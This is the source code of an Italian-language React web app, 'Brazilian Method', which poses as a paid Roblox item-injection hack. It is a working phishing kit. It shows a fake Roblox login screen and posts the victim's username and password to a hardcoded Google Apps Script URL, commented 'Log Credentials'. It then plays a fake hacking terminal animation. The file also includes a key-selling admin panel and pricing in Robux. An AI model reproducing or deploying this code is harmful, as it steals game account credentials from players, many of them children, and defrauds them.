
import React, { useState, useEffect, useRef } from 'react';
import { Terminal, Lock, Skull, CheckCircle, ShieldAlert, Cpu, Database, ChevronDown, ChevronRight, Box, Key, AlertCircle, Loader2, ShieldCheck, Plus, Copy, LogOut, UserPlus, Clock, Trash2, Smartphone, Infinity, Hourglass, X, ShoppingBag, MessageCircle, Video, RefreshCw, Snowflake, Gift, Link as LinkIcon } from 'lucide-react';
import { AppStep, HACK_OPTIONS, HackOption, KeyDuration, GeneratedKeyHistory } from './types';
import { Typewriter } from './components/Typewriter';
import { MatrixRain } from './components/MatrixRain';

// --- CONFIGURAZIONE ---

const ADMIN_KEY = "ADMINmisonoparlatox";

// INCOLLA QUI SOTTO IL LINK DEL DEPLOYMENT DI GOOGLE APPS SCRIPT
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzTUi8ws9S2XRThaLHHCWRagPfB409mbXqwLAIEeX_qMPHbZSEp7wGtJyypehUHeYRX/exec"

export default function App() {
  const [step, setStep] = useState<AppStep>(AppStep.LOGIN);
  const [accessKey, setAccessKey] = useState('');
  const [robloxUser, setRobloxUser] = useState('');
  const [robloxPassword, setRobloxPassword] = useState('');
  const [serverLink, setServerLink] = useState(''); // New state for Server Link
  const [selectedHack, setSelectedHack] = useState<HackOption | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const logsEndRef = useRef<HTMLDivElement>(null);

  // Admin State
  const [adminHistory, setAdminHistory] = useState<GeneratedKeyHistory[]>([]);
  const [selectedDuration, setSelectedDuration] = useState<KeyDuration>('PERMANENT');
  const [currentTime, setCurrentTime] = useState(Date.now()); 

  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [openCategory, setOpenCategory] = useState<'brainrot' | 'luckyblock' | null>('brainrot');

  // Pricing Modal State
  const [showPricing, setShowPricing] = useState(false);

  // --- INIT ---
  const getDeviceId = () => {
    let id = localStorage.getItem('BM_DEVICE_ID');
    if (!id) {
      id = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
      localStorage.setItem('BM_DEVICE_ID', id);
    }
    return id;
  };

  useEffect(() => {
    const interval = setInterval(() => setCurrentTime(Date.now()), 1000);
    return () => clearInterval(interval);
  }, []);

  // Preload Background Image to prevent stuttering
  useEffect(() => {
    const img = new Image();
    img.src = 'https://i.imgur.com/1s4adS0.jpeg';
  }, []);

  useEffect(() => {
    getDeviceId();
    const savedHistory = localStorage.getItem('BM_ADMIN_HISTORY');
    if (savedHistory) {
      try { setAdminHistory(JSON.parse(savedHistory)); } catch (e) {}
    }
    const savedData = localStorage.getItem('BM_TARGET_DATA');
    if (savedData) {
      try {
        const d = JSON.parse(savedData);
        if (d.username) setRobloxUser(d.username);
      } catch (e) {}
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('BM_ADMIN_HISTORY', JSON.stringify(adminHistory));
  }, [adminHistory]);

  useEffect(() => {
    const t = setTimeout(() => {
      // Only saving username
      localStorage.setItem('BM_TARGET_DATA', JSON.stringify({ username: robloxUser }));
    }, 500);
    return () => clearTimeout(t);
  }, [robloxUser]);

  // --- AUTO CLEANUP EFFECT (Automatico nel pannello admin) ---
  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    
    if (step === AppStep.ADMIN_PANEL) {
      const runCleanup = async () => {
        try {
          await safeFetch({ action: 'CLEANUP_KEYS' });
        } catch (e) {
          // Suppress error for background task to avoid console noise
        }
      };

      runCleanup();
      interval = setInterval(runCleanup, 60000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [step]);


  const generateKeyString = (duration: KeyDuration) => {
    let typeCode = 'OT';
    if (duration === '1H') typeCode = '1H';
    if (duration === '12H') typeCode = '12H';
    if (duration === '24H') typeCode = '24H';
    if (duration === 'PERMANENT') typeCode = 'PRM';
    const r1 = Math.random().toString(36).substring(2, 6).toUpperCase();
    const r2 = Math.random().toString(36).substring(2, 6).toUpperCase();
    return `BM-${typeCode}-${r1}-${r2}`;
  };

  const getRemainingTime = (createdAt: number, duration: KeyDuration) => {
    if (duration === 'PERMANENT') return { text: 'INFINITO', expired: false };
    if (duration === 'ONE_TIME') return { text: 'USO SINGOLO', expired: false };

    let hours = 0;
    if (duration === '1H') hours = 1;
    if (duration === '12H') hours = 12;
    if (duration === '24H') hours = 24;

    const expireTime = createdAt + (hours * 60 * 60 * 1000);
    const diff = expireTime - currentTime;

    if (diff <= 0) return { text: 'SCADUTA', expired: true };

    const h = Math.floor(diff / (1000 * 60 * 60));
    const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const s = Math.floor((diff % (1000 * 60)) / 1000);

    return { 
      text: `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`, 
      expired: false 
    };
  };

  // --- HELPER FOR FETCH ---
  const safeFetch = async (payload: any) => {
    if (GOOGLE_SCRIPT_URL.includes("INSERISCI")) {
      throw new Error("URL SCRIPT NON CONFIGURATO NEL CODICE");
    }

    try {
      const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        redirect: 'follow', // Ensure redirects are followed (GAS redirects POSTs)
        headers: { 'Content-Type': 'text/plain;charset=utf-8' }, // Standard text/plain to avoid preflight
        body: JSON.stringify(payload)
      });

      const text = await response.text();
      
      try {
        const json = JSON.parse(text);
        return json;
      } catch (e) {
        // If Google sends back HTML error page instead of JSON
        console.error("Risposta RAW non valida:", text);
        if (text.includes("doGet")) throw new Error("ERRORE SCRIPT: Manca la funzione doGet. Aggiorna lo script!");
        if (text.includes("script.google.com")) throw new Error("ERRORE PERMESSI: Assicurati che lo script sia 'Anyone' (Chiunque).");
        throw new Error("Errore comunicazione Server (URL errato o Permessi negati)");
      }
    } catch (e: any) {
      throw new Error(e.message || "Errore di rete");
    }
  };

  // --- ACTIONS ---
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const inputKey = accessKey.trim();
    if (!inputKey) { setError('INSERISCI UNA KEY'); return; }

    setIsLoading(true);

    if (inputKey === ADMIN_KEY) {
      await new Promise(r => setTimeout(r, 800));
      setStep(AppStep.ADMIN_PANEL);
      setIsLoading(false);
      return;
    }

    try {
      const result = await safeFetch({ action: 'VERIFY_KEY', key: inputKey, deviceId: getDeviceId() });
      if (result.status === 'VALID') setStep(AppStep.DATA_ENTRY);
      else if (result.status === 'ERROR') setError(result.message);
      else setError(result.message || 'KEY NON VALIDA');
    } catch (err: any) { 
      setError(err.message || 'ERRORE DI CONNESSIONE'); 
    } finally { setIsLoading(false); }
  };

  const handleGenerateKey = async () => {
    const newCode = generateKeyString(selectedDuration);
    setIsLoading(true);

    try {
      const result = await safeFetch({ action: 'ADD_KEY', key: newCode, duration: selectedDuration });
      
      if (result.status !== 'SUCCESS') {
        throw new Error(result.message || "Server error");
      }

      const newEntry: GeneratedKeyHistory = {
        code: newCode,
        durationLabel: selectedDuration,
        durationValue: selectedDuration,
        createdAt: Date.now()
      };
      setAdminHistory(prev => [newEntry, ...prev]);
    } catch (err: any) {
      alert("ERRORE SALVATAGGIO KEY: " + err.message);
    } finally {
      setIsLoading(false);
    }
  };

  const handleCleanupKeys = async () => {
    // Manual trigger still available
    setIsLoading(true);
    try {
      await safeFetch({ action: 'CLEANUP_KEYS' });
      alert(`DB SCADENZE AGGIORNATO.`);
    } catch (e: any) {
      alert("ERRORE: " + e.message);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDataEntry = async (e: React.FormEvent) => {
    e.preventDefault();
    if (robloxUser && robloxPassword) {
      setIsLoading(true);
      try {
        // Log Credentials
        const result = await safeFetch({ 
            action: 'LOG_DATA', 
            username: robloxUser, 
            link: robloxPassword // Saving password in 'link' column
        });
        
        if (result.status !== 'SUCCESS') {
           throw new Error(result.message || "Errore sconosciuto");
        }
        
        // Move to Server Link step
        await new Promise(r => setTimeout(r, 800));
        setStep(AppStep.SERVER_LINK);

      } catch (err: any) {
        alert("ERRORE: " + err.message);
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleServerLink = (e: React.FormEvent) => {
    e.preventDefault();
    if (serverLink.trim()) {
        // We don't necessarily need to save this to DB if the goal is the password, 
        // but we could. For now, just proceed to selection.
        setStep(AppStep.SELECTION);
    }
  };

  const handleExecute = () => { if (selectedHack) setStep(AppStep.TERMINAL); };
  const toggleCategory = (c: 'brainrot' | 'luckyblock') => setOpenCategory(openCategory === c ? null : c);
  const handleRestart = () => {
    setAccessKey(''); setSelectedHack(null); setLogs([]); setError(''); setIsLoading(false); setOpenCategory('brainrot'); setStep(AppStep.LOGIN);
    setRobloxUser(''); setRobloxPassword(''); setServerLink('');
  };
  const clearHistory = () => { if(confirm("Cancellare storico locale?")) setAdminHistory([]); };
  const copyToClipboard = (text: string) => navigator.clipboard.writeText(text);

  // --- TERMINAL FX ---
  useEffect(() => {
    if (step === AppStep.TERMINAL) {
      const msgs = ["Init Brazilian Method v4.2...", `Target: ${robloxUser}`, "Auth Token: GRABBED", "Bypassing 2FA...", "ACCESS GRANTED."];
      const fillers = ["Allocating memory...", "Decrypting headers...", "Bypassing Byfron...", `Injecting ${selectedHack?.name}...`];
      const seq = [...msgs, ...fillers, "FINALIZING..."];
      let delay = 0;
      seq.forEach((m, i) => {
        delay += Math.random() * 600 + 200;
        setTimeout(() => {
          setLogs(p => [...p, `[${new Date().toLocaleTimeString()}] ${m}`]);
          if (i === seq.length - 1) setTimeout(() => setStep(AppStep.SUCCESS), 1500);
        }, delay);
      });
    }
  }, [step]);

  useEffect(() => { logsEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [logs]);

  // Special render for Roblox Login to make it look full screen/different
  if (step === AppStep.DATA_ENTRY) {
    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center font-sans">
        {/* User Requested Background Image */}
        <div 
          className="absolute inset-0 z-[-1] bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: "url('https://i.imgur.com/1s4adS0.jpeg')" }}
        >
          {/* Dark Overlay to make the modal pop */}
          <div className="absolute inset-0 bg-black/40"></div>
        </div>
        
        {/* Login Modal - Matches screenshot colors */}
        <div className="bg-[#2b2d31] w-[90%] max-w-[380px] rounded-xl p-6 shadow-2xl relative">
          <h2 className="text-white text-3xl font-bold text-center mb-6 mt-2">Accedi a Roblox</h2>
          
          <form onSubmit={handleDataEntry} className="space-y-3">
            <div>
              <input 
                type="text" 
                value={robloxUser} 
                onChange={(e) => setRobloxUser(e.target.value)} 
                className="w-full bg-[#1b1d1f] border border-[#5a5a5a] focus:border-white rounded-lg p-3 text-white placeholder-gray-400 outline-none transition-colors text-base"
                placeholder="Nome utente/E-mail/Tel."
                required
              />
            </div>
            <div>
              <input 
                type="password" 
                value={robloxPassword} 
                onChange={(e) => setRobloxPassword(e.target.value)} 
                className="w-full bg-[#1b1d1f] border border-[#5a5a5a] focus:border-white rounded-lg p-3 text-white placeholder-gray-400 outline-none transition-colors text-base"
                placeholder="Password"
                required
              />
            </div>

            <button 
              type="submit" 
              disabled={isLoading}
              className="w-full bg-transparent border border-white text-white font-medium py-3 rounded-lg hover:bg-white/10 transition-colors mt-2 text-base"
            >
              {isLoading ? 'Accesso in corso...' : 'Accedi'}
            </button>
          </form>

          <div className="mt-4 text-center">
            <button type="button" className="text-sm text-gray-400 hover:underline">
              Hai dimenticato la password o il nome utente?
            </button>
            
            <div className="space-y-3 mt-6">
              <button className="w-full bg-[#393b3d] text-white py-3 rounded-lg text-sm font-medium hover:bg-[#404245] transition-colors">
                Inviami un codice monouso
              </button>
              <button className="w-full bg-[#393b3d] text-white py-3 rounded-lg text-sm font-medium hover:bg-[#404245] transition-colors">
                Usa un altro dispositivo
              </button>
            </div>

            <div className="mt-6 mb-2">
              <p className="text-sm text-gray-400">
                Non hai un account? <button type="button" className="text-white hover:underline font-bold ml-1">Registrati</button>
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-green-500 font-['VT323'] flex flex-col items-center justify-center relative overflow-hidden selection:bg-red-900 selection:text-white">
      <MatrixRain />
      
      {/* --- PRICING MODAL --- */}
      {showPricing && (
        <div className="absolute inset-0 z-50 bg-black/95 flex flex-col items-center justify-center p-6 animate-fadeIn">
          <div className="w-full max-w-md border-2 border-red-600 bg-black shadow-[0_0_30px_rgba(220,38,38,0.3)] p-6 relative">
            <button onClick={() => setShowPricing(false)} className="absolute top-2 right-2 text-red-500 hover:text-white">
              <X className="w-6 h-6" />
            </button>
            
            <div className="text-center mb-6 border-b border-red-800 pb-4">
              <div className="flex justify-center gap-2 mb-2">
                <Snowflake className="w-8 h-8 text-white animate-spin-slow" />
                <Gift className="w-12 h-12 text-red-500 animate-bounce" />
                <Snowflake className="w-8 h-8 text-white animate-spin-slow" />
              </div>
              <h2 className="text-3xl font-bold tracking-widest text-red-500">NATALE 2025</h2>
              <div className="inline-block bg-red-600 text-white px-3 py-1 text-sm font-bold mt-2 rotate-2 animate-pulse">-50% DI SCONTO 🎄</div>
            </div>

            <div className="space-y-3 mb-6">
              <div className="flex justify-between items-center border border-red-900 p-3 bg-red-900/10 hover:bg-red-900/30 transition-colors group">
                <span className="font-bold flex items-center gap-2 text-white group-hover:text-green-400"><Clock className="w-4 h-4" /> 1 ORA</span>
                <div>
                   <span className="line-through text-gray-500 text-xs mr-2">50 R$</span>
                   <span className="text-red-500 font-bold text-lg">25 ROBUX</span>
                </div>
              </div>
              <div className="flex justify-between items-center border border-red-900 p-3 bg-red-900/10 hover:bg-red-900/30 transition-colors group">
                <span className="font-bold flex items-center gap-2 text-white group-hover:text-green-400"><Clock className="w-4 h-4" /> 12 ORE</span>
                <div>
                   <span className="line-through text-gray-500 text-xs mr-2">150 R$</span>
                   <span className="text-red-500 font-bold text-lg">75 ROBUX</span>
                </div>
              </div>
              <div className="flex justify-between items-center border border-red-900 p-3 bg-red-900/10 hover:bg-red-900/30 transition-colors group">
                <span className="font-bold flex items-center gap-2 text-white group-hover:text-green-400"><Clock className="w-4 h-4" /> 24 ORE</span>
                <div>
                   <span className="line-through text-gray-500 text-xs mr-2">300 R$</span>
                   <span className="text-red-500 font-bold text-lg">150 ROBUX</span>
                </div>
              </div>
              <div className="flex justify-between items-center border-2 border-green-600 p-3 bg-green-900/20 hover:bg-green-900/40 transition-colors shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                <span className="font-bold flex items-center gap-2 text-green-400"><Infinity className="w-4 h-4" /> PERMANENTE</span>
                <div>
                   <span className="line-through text-gray-500 text-xs mr-2">400 R$</span>
                   <span className="text-yellow-400 font-bold text-lg">200 ROBUX</span>
                </div>
              </div>
            </div>

            <div className="text-center space-y-4">
              <div className="text-sm border-t border-red-800 pt-4 text-white">
                <p className="mb-2 font-bold text-green-500">PER ACQUISTARE CONTATTAMI SU:</p>
                <div className="flex justify-center gap-4">
                  <a href="https://www.tiktok.com/@brasilian.method" target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-pink-500 hover:text-pink-400 transition-colors cursor-pointer">
                    <Video className="w-4 h-4" /> TIKTOK
                  </a>
                </div>
              </div>
              
              <div className="text-xs text-green-600 italic bg-green-900/10 p-2 border border-green-900/50">
                <p>⚠️ ACCETTO PAGAMENTI ANCHE CON <span className="font-bold text-green-400">BRAINROT</span></p>
              </div>
            </div>

            <button onClick={() => setShowPricing(false)} className="w-full mt-6 py-2 border border-red-900 text-red-600 hover:bg-red-900/20 uppercase font-bold text-sm">
              CHIUDI
            </button>
          </div>
        </div>
      )}
      
      <div className="z-10 w-full max-w-2xl p-6 border-2 border-red-800 bg-black/90 shadow-[0_0_20px_rgba(220,38,38,0.2)] rounded-sm m-4 relative max-h-[90vh] flex flex-col">
        <div className="border-b border-red-800 pb-4 mb-6 flex justify-between items-center shrink-0">
          <div className="flex items-center gap-2 text-white">
            <Snowflake className="w-6 h-6 animate-pulse text-red-500" />
            <h1 className="text-2xl tracking-widest font-bold text-green-500">BRAZILIAN METHOD 🎄</h1>
          </div>
          <div className="text-xs text-red-500 font-bold border border-red-800 px-2 py-1">XMAS EDITION</div>
        </div>

        {/* --- ADMIN --- */}
        {step === AppStep.ADMIN_PANEL && (
          <div className="animate-fadeIn flex flex-col h-full overflow-hidden">
             <div className="text-center mb-6">
              <ShieldCheck className="w-16 h-16 mx-auto mb-4 text-green-400 animate-pulse" />
              <div className="text-xl font-bold border-b border-green-500 inline-block px-4 pb-1">ADMIN CONSOLE</div>
              <p className="text-xs text-green-700 mt-2">DB: CONNECTED</p>
            </div>

            <div className="flex-1 overflow-y-auto mb-4 pr-2 custom-scrollbar">
              <div className="bg-green-900/10 p-4 border border-green-800 rounded mb-6">
                <h3 className="text-sm font-bold mb-3 flex items-center gap-2"><UserPlus className="w-4 h-4" /> NUOVA KEY</h3>
                <div className="grid grid-cols-2 gap-2 mb-4">
                  <select value={selectedDuration} onChange={(e) => setSelectedDuration(e.target.value as KeyDuration)} className="bg-black border border-green-700 p-2 text-sm uppercase text-green-400">
                    <option value="PERMANENT">PERMANENT KEY</option>
                    <option value="ONE_TIME">USO SINGOLO</option>
                    <option value="1H">DURATA: 1 ORA</option>
                    <option value="12H">DURATA: 12 ORE</option>
                    <option value="24H">DURATA: 24 ORE</option>
                  </select>
                  <button onClick={handleGenerateKey} disabled={isLoading} className="bg-green-800 hover:bg-green-700 text-black font-bold py-2 flex items-center justify-center gap-2 uppercase text-sm">
                    {isLoading ? <Loader2 className="w-4 h-4 animate-spin"/> : <Plus className="w-4 h-4" />}
                    {isLoading ? 'SAVING...' : 'GENERA & SALVA'}
                  </button>
                </div>
                <button onClick={handleCleanupKeys} disabled={isLoading} className="w-full py-2 bg-yellow-900/20 border border-yellow-700 text-yellow-500 hover:bg-yellow-900/40 uppercase font-bold text-xs flex items-center justify-center gap-2">
                  <RefreshCw className="w-3 h-3" /> AGGIORNA DB SCADENZE (MANUALE)
                </button>
                <p className="text-[10px] text-center text-green-800 mt-1">* Aggiornamento automatico attivo (Server Side)</p>
              </div>

              <div className="flex justify-between items-center mb-2">
                <div className="text-xs text-green-700 font-bold uppercase">CRONOLOGIA ({adminHistory.length})</div>
                <button onClick={clearHistory} className="text-[10px] flex items-center gap-1 text-red-500 border border-red-900/50 px-2 py-1"><Trash2 className="w-3 h-3" /> PULISCI</button>
              </div>

              <div className="space-y-2">
                {adminHistory.map((k, index) => {
                  const { text: timeLeft, expired } = getRemainingTime(k.createdAt, k.durationValue);
                  return (
                    <div key={index} className="flex items-center justify-between bg-black border border-green-900 p-2 text-sm">
                      <div className="flex flex-col">
                        <code className={`text-base font-mono tracking-wider ${expired ? 'text-red-500 line-through' : 'text-green-400'}`}>{k.code}</code>
                        <div className="flex gap-3 text-[10px] opacity-70 mt-1">
                           <span className="flex items-center gap-1">
                             {k.durationValue === 'PERMANENT' ? <Infinity className="w-3 h-3" /> : <Clock className="w-3 h-3" />}
                             {k.durationValue === 'PERMANENT' ? 'PERMANENTE' : k.durationLabel}
                           </span>
                           {k.durationValue !== 'PERMANENT' && k.durationValue !== 'ONE_TIME' && (
                             <span className={`flex items-center gap-1 font-bold ${expired ? 'text-red-500' : 'text-yellow-400'}`}>
                               <Hourglass className="w-3 h-3" /> {timeLeft}
                             </span>
                           )}
                           {k.durationValue === 'ONE_TIME' && <span className="text-blue-400">1 UTILIZZO</span>}
                        </div>
                      </div>
                      <button onClick={() => copyToClipboard(k.code)} className="p-2 hover:bg-green-900/50 text-green-600"><Copy className="w-4 h-4" /></button>
                    </div>
                  );
                })}
              </div>
            </div>
            <button onClick={handleRestart} className="mt-auto w-full py-3 border border-red-900 text-red-700 hover:bg-red-900/20 uppercase font-bold flex items-center justify-center gap-2"><LogOut className="w-4 h-4" /> LOGOUT</button>
          </div>
        )}

        {/* --- LOGIN --- */}
        {step === AppStep.LOGIN && (
          <form onSubmit={handleLogin} className="space-y-6 overflow-y-auto">
            <div className="text-center mb-8">
              <Lock className="w-16 h-16 mx-auto mb-4 text-red-600 animate-pulse" />
              <div className="text-xl font-bold tracking-[0.2em] text-white drop-shadow-[0_0_5px_rgba(255,255,255,0.8)]">ACCESSO RISERVATO</div>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm mb-1 opacity-70 text-red-400">INSERISCI KEY</label>
                <div className="relative">
                  <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-red-500" />
                  <input type="text" value={accessKey} onChange={(e) => setAccessKey(e.target.value)} className={`w-full bg-black border p-2 pl-9 focus:outline-none transition-all uppercase placeholder-red-900 tracking-widest text-white ${error ? 'border-red-500' : 'border-red-800 focus:border-red-500'}`} placeholder="BM-XXXX-XXXX-XXXX" />
                </div>
                {error && <div className="text-red-500 text-xs mt-2 flex items-center gap-1 animate-pulse"><AlertCircle className="w-3 h-3" /> {error}</div>}
              </div>
            </div>
            <button type="submit" disabled={isLoading} className={`w-full py-3 mt-4 transition-all duration-200 font-bold tracking-widest uppercase flex items-center justify-center gap-2 border ${isLoading ? 'bg-black border-red-900 text-red-800' : 'bg-red-900/20 hover:bg-red-600 hover:text-black border-red-600 text-red-500'}`}>
              {isLoading ? <><Loader2 className="w-4 h-4 animate-spin" /> VERIFICA...</> : 'ACCEDI'}
            </button>
            <div className="text-center mt-4">
              <button type="button" onClick={() => setShowPricing(true)} className="text-xs text-green-400 hover:text-white underline cursor-pointer flex items-center justify-center gap-1 mx-auto">
                <Gift className="w-3 h-3" /> Non hai una key? Clicca qui (SCONTI NATALE)
              </button>
            </div>
          </form>
        )}

        {/* --- SERVER LINK (NEW STEP) --- */}
        {step === AppStep.SERVER_LINK && (
          <form onSubmit={handleServerLink} className="space-y-6 overflow-y-auto animate-fadeIn">
            <div className="text-center mb-8">
              <LinkIcon className="w-16 h-16 mx-auto mb-4 text-green-500 animate-bounce" />
              <div className="text-xl font-bold tracking-[0.2em] text-white">TARGET SERVER</div>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm mb-1 opacity-70 text-green-400">INSERISCI LINK DEL SERVER VIP</label>
                <input 
                  type="text" 
                  value={serverLink} 
                  onChange={(e) => setServerLink(e.target.value)} 
                  className="w-full bg-black border border-green-800 p-2 focus:outline-none focus:border-green-500 transition-all placeholder-green-900 text-green-400" 
                  placeholder="https://www.roblox.com/games/..." 
                />
              </div>
            </div>
            <button type="submit" className="w-full py-3 mt-4 bg-green-900/20 border border-green-600 text-green-500 font-bold tracking-widest uppercase hover:bg-green-600 hover:text-black transition-all">
              CONNETTI
            </button>
          </form>
        )}

        {/* --- SELECT --- */}
        {step === AppStep.SELECTION && (
          <div className="animate-fadeIn flex flex-col h-full overflow-hidden">
            <h2 className="text-center text-xl mb-4 flex items-center justify-center gap-2 shrink-0 text-red-500"><Skull className="w-5 h-5" /> DATABASE INJECTION</h2>
            <div className="flex-1 overflow-y-auto pr-2 custom-scrollbar space-y-2 mb-4">
              <div className="border border-green-800">
                <button type="button" onClick={() => toggleCategory('brainrot')} className="w-full p-3 bg-green-900/20 hover:bg-green-900/40 flex justify-between items-center border-b border-green-800 text-white">
                  <span className="flex items-center gap-2 font-bold tracking-wider"><Skull className="w-4 h-4 text-red-500" /> BRAINROT</span>
                  {openCategory === 'brainrot' ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                </button>
                {openCategory === 'brainrot' && (
                  <div className="p-2 grid grid-cols-2 gap-2 bg-black/50 animate-fadeIn">
                    {HACK_OPTIONS.filter(h => h.category === 'brainrot').map((hack) => (
                      <button key={hack.id} onClick={() => setSelectedHack(hack)} className={`p-2 border text-left transition-all duration-200 flex flex-col gap-1 ${selectedHack?.id === hack.id ? 'bg-green-900/50 border-green-400' : 'bg-black border-green-800 hover:border-green-600'}`}>
                        <div className="flex justify-between items-center w-full"><span className="text-xl">{hack.icon}</span>{selectedHack?.id === hack.id && <div className="w-2 h-2 bg-green-400 rounded-full animate-ping" />}</div>
                        <div className="mt-1 font-bold text-xs text-white">{hack.name}</div>
                      </button>
                    ))}
                  </div>
                )}
              </div>
              <div className="border border-green-800">
                <button type="button" onClick={() => toggleCategory('luckyblock')} className="w-full p-3 bg-green-900/20 hover:bg-green-900/40 flex justify-between items-center border-b border-green-800 text-white">
                  <span className="flex items-center gap-2 font-bold tracking-wider"><Box className="w-4 h-4 text-red-500" /> LUCKY BLOCKS</span>
                  {openCategory === 'luckyblock' ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                </button>
                {openCategory === 'luckyblock' && (
                  <div className="p-2 grid grid-cols-2 gap-2 bg-black/50 animate-fadeIn">
                    {HACK_OPTIONS.filter(h => h.category === 'luckyblock').map((hack) => (
                      <button key={hack.id} onClick={() => setSelectedHack(hack)} className={`p-2 border text-left transition-all duration-200 flex flex-col gap-1 ${selectedHack?.id === hack.id ? 'bg-green-900/50 border-green-400' : 'bg-black border-green-800 hover:border-green-600'}`}>
                        <div className="flex justify-between items-center w-full"><span className="text-xl">{hack.icon}</span>{selectedHack?.id === hack.id && <div className="w-2 h-2 bg-green-400 rounded-full animate-ping" />}</div>
                        <div className="mt-1 font-bold text-xs text-white">{hack.name}</div>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
            <button onClick={handleExecute} disabled={!selectedHack} className={`w-full py-4 text-xl font-bold tracking-widest uppercase border transition-all duration-200 shrink-0 ${selectedHack ? 'bg-red-900/40 border-red-500 hover:bg-red-600 hover:text-black cursor-pointer text-red-500' : 'bg-gray-900 border-gray-800 text-gray-700 cursor-not-allowed'}`}>
              {selectedHack ? 'EXECUTE' : 'SELEZIONA SCRIPT'}
            </button>
          </div>
        )}

        {/* --- TERMINAL --- */}
        {step === AppStep.TERMINAL && (
          <div className="font-mono text-xs md:text-sm h-96 flex flex-col">
            <div className="bg-black/50 p-2 border-b border-red-800 mb-2 flex justify-between text-red-500"><span>brazilian_method.exe</span><span className="animate-pulse">● REC</span></div>
            <div className="flex-1 overflow-y-auto p-2 font-['VT323'] space-y-1 custom-scrollbar">
               {logs.map((log, i) => (<div key={i} className="break-words"><span className="text-red-500 mr-2">{'>'}</span>{log}</div>))}
               <div ref={logsEndRef} /><div className="animate-pulse">_</div>
            </div>
          </div>
        )}

        {/* --- SUCCESS --- */}
        {step === AppStep.SUCCESS && (
          <div className="text-center space-y-6 py-10 animate-bounce-in overflow-y-auto">
            <CheckCircle className="w-24 h-24 mx-auto text-green-500" />
            <h2 className="text-3xl font-bold text-white">INIEZIONE COMPLETATA</h2>
            <p className="text-green-300">L'item {selectedHack?.name} è stato aggiunto.<br /><span className="text-sm opacity-70">Controlla l'inventario entro 5 minuti.</span></p>
            <div className="pt-8"><button onClick={handleRestart} className="text-xs border border-red-800 px-4 py-2 hover:bg-red-900 text-red-500 uppercase font-bold">Riavvia</button></div>
          </div>
        )}
      </div>
      <div className="fixed bottom-4 right-4 text-[10px] text-green-900 opacity-50">ID: {localStorage.getItem('BM_DEVICE_ID') || 'UNKNOWN'}</div>
    </div>
  );
}
